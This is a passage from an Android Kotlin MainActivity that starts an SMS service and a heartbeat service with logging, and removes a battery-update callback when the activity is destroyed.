                startService(intent)
            }
            Log.d(TAG, "✅ SmsService started")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start SmsService: ${e.message}")
        }
    }

    private fun startHeartbeatService() {
        try {
            val intent = Intent(this, HeartbeatService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
            Log.d(TAG, "✅ HeartbeatService started")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start HeartbeatService: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacks(batteryUpdater)
        Log.d(TAG, "👋 MainActivity destroyed")
    }
}